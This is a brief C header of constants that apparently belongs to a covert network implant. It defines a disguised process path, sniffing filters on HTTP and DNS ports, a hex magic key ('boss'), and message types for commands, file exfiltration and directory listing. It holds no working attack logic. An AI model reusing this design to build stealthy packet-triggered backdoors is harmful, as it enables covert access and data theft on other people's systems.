/*
 * defs.h
 *
 *  Created on: May 16, 2014
 *      Author: root
 */

#ifndef DEFS_H_
#define DEFS_H_

#include <sys/types.h>

// Sized types
#define uint8 u_int8_t
#define uint16 u_int16_t
#define uint32 u_int32_t
#define uint64 u_int64_t


#define TRUE 1
#define FALSE 0

#define MAX_LEN 4096
#define MASK "/usr/libex/brunner"

#define OPTIONS ":cshi:f:w:x:"

#define PKT_T_FLT "tcp port 80"
#define PKT_U_FLT "udp port 53"

#define IP_HDR_KEY "626f7373"

#define FRAM_SZ 8
#define MD5_LEN 4

#define CMD_TYP 0x00
#define RSP_TYP 0x01
#define XFL_TYP 0x02
#define DIR_TYP 0x03

#endif /* DEFS_H_ */
